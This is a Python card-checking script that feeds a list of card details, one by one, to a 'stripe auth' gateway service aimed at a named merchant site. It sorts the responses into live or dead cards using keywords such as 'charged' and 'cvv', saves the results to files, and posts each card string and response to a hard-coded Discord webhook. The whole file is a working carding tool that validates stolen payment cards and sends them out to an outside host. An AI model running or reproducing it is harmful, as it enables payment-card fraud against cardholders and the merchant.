import requests
import json
import urllib.parse
import time

INPUT_FILE = "list.txt"
BASE_URL = "https://titanautostripeauth.onrender.com/gateway=titanautostripe/key=titanfuryy/site=dilaboards.com/cc="
WEBHOOK_URL = "https://discord.com/api/webhooks/1443879354420559902/YkR6tWOSeIB8bl1XlqV6rGjA4eb9b8PQcX7rywqEjqOIgmIPIZ2rcIhWxjyaq3ECILDM"

approved = []
declined = []
unknown = []
errors = []


# ─── DISCORD EMBED SENDER ─────────────────────────────────────────────
def send_embed(title, description, color):
    payload = {
        "embeds": [
            {
                "title": title,
                "description": description[:4090],
                "color": color,
                "footer": {"text": "String Logger"}
            }
        ]
    }
    try:
        requests.post(WEBHOOK_URL, json=payload, timeout=10)
    except:
        pass


# ─── CLASSIFIER ───────────────────────────────────────────────────────
def classify(msg: str):
    msg = str(msg).lower()

    approved_words = ["approve", "approved", "success", "charged", "live"]
    declined_words = ["declined", "dead", "insufficient", "incorrect", "blocked", "expired", "cvv", "cvc"]

    for w in approved_words:
        if w in msg:
            return "approved"

    for w in declined_words:
        if w in msg:
            return "declined"

    return "unknown"


# ─── INPUT ────────────────────────────────────────────────────────────
with open(INPUT_FILE, "r", encoding="utf-8") as f:
    lines = f.read().splitlines()

send_embed("Checker Started", "Requests are now being sent to API.", 3447003)  # Blue


# ─── MAIN LOOP ────────────────────────────────────────────────────────
for index, line in enumerate(lines, start=1):
    if not line.strip():
        continue

    url = BASE_URL + urllib.parse.quote(line)

    try:
        r = requests.get(url, timeout=30)
        data = r.json()

        # Read BOTH message & raw_response
        resp_obj = data.get("Response", {})
        response_msg = (
            resp_obj.get("message")
            or resp_obj.get("raw_response")
            or json.dumps(resp_obj)
        )

        # Build display
        pretty_json = json.dumps(data, indent=2)
        record = f"request {url}\nresponse ```json\n{pretty_json}\n```"

        category = classify(response_msg)

        if category == "approved":
            approved.append(record)
            send_embed("✅ APPROVED", record, 3066993)   # Green

        elif category == "declined":
            declined.append(record)
            send_embed("❌ DECLINED", record, 15158332)  # Red

        else:
            unknown.append(record)
            send_embed("⚠ UNKNOWN", record, 15844367)   # Yellow

        print(f"[{index}] {category.upper()} -> {response_msg}")

        # If API rate limits, slow down more
        if "too many requests" in str(response_msg).lower():
            time.sleep(5)
        else:
            time.sleep(2.5)  # Normal delay

    except json.JSONDecodeError:
        record = f"request {url}\nresponse ❌ Invalid JSON"
        errors.append(record)
        send_embed("🚫 ERROR", record, 9807270)
        time.sleep(3)

    except Exception as e:
        record = f"request {url}\nresponse ❌ {str(e)}"
        errors.append(record)
        send_embed("🚫 ERROR", record, 9807270)
        time.sleep(3)


# ─── SAVE FILES ───────────────────────────────────────────────────────
open("approved.txt", "w", encoding="utf-8").write("\n".join(approved))
open("declined.txt", "w", encoding="utf-8").write("\n".join(declined))
open("unknown.txt", "w", encoding="utf-8").write("\n".join(unknown))
open("error.txt", "w", encoding="utf-8").write("\n".join(errors))


# ─── FINAL SUMMARY ────────────────────────────────────────────────────
summary = (
    f"✅ Approved: {len(approved)}\n"
    f"❌ Declined: {len(declined)}\n"
    f"⚠ Unknown: {len(unknown)}\n"
    f"🚫 Errors: {len(errors)}"
)

send_embed("Finished Checking", summary, 5763719)  # Purple
print("\n✅ DONE CHECKING")
print(summary)
